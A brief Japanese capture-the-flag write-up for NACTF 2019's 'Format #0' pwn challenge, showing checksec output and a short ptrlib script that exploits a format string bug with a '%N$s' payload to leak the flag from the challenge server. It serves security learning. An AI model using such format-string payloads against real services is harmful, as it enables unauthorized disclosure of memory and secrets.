# [pwn 200pts] Format #0 - Network Academia CTF 2019
32ビットバイナリで、全部無効です。
```
$ checksec -f format-0
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable  FILE
Partial RELRO   No canary found   NX disabled   No PIE          No RPATH   RW-RUNPATH   71 Symbols     No       0               4       format-0
```

FSBがありますが、フラグのアドレスがスタックに積まれているので%sで読むだけです。
```python
from ptrlib import *

#sock = Process("./format-0")
sock = Socket("shell.2019.nactf.com", 31782)
payload = '%{}$s'.format(8 + 64 // 4)
sock.sendlineafter(">", payload)

sock.interactive()
```

# 感想
簡単ですね。
